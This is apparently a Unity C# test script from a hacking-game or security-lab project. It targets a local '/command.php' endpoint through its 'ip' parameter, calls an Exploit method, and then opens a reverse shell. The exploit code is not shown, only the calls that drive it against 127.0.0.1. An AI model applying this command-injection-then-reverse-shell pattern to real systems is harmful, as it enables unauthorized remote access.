using System.Collections;
using System.Collections.Generic;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using Renci.SshNet;
using Service;
using Service.Exploit;
using UnityEngine;

public class Test : MonoBehaviour
{
    // Start is called before the first frame update
    async void Start()
    {
        Machine.Machine machine = new Machine.Machine("127.0.0.1");

        InputWebService service = new InputWebService(
            machine,
            "127.0.0.1",
            80,
            "/command.php",
            Utils.WebMethod.GET,
            "ip"
        );
        //Thread t = new Thread(service.Exploit);
        //t.Start();
        //t.Join();
        await service.Exploit(true);
        Debug.Log("Ended exploitation.");
        await service.Shell.EstablishReverseShell();
    }

    // Update is called once per frame
    void Update()
    {
        
    }
}
